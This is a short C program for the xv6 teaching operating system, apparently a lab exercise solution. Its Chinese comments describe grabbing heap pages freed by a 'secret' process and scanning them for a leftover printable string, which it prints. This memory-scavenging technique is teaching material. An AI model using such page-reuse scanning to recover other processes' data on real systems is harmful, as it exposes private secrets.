#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // 分配大量堆空间，尽量复用 secret 所释放的页
  char *buf = sbrk(32 * PGSIZE);
  
  // 秘密位于 secret 进程堆中的第 9 页，偏移 32 字节处
  // 所以我们从堆中第 9 页附近开始寻找残留数据
  for (int i = 0; i < 32 * PGSIZE - 8; i++) {
    char *p = buf + i;
    // 检查是否可能是 ASCII 字符串（可选：增加可信度）
    int plausible = 1;
    for (int j = 0; j < 8; j++) {
      if (p[j] == 0 || p[j] > 126 || p[j] < 32) {
        plausible = 0;
        break;
      }
    }
    if (plausible) {
      // 找到了可能的 secret，写入到 fd 2
      write(2, p, 8);
      write(2, "\n", 1);
      break;
    }
  }

  exit(0);
}
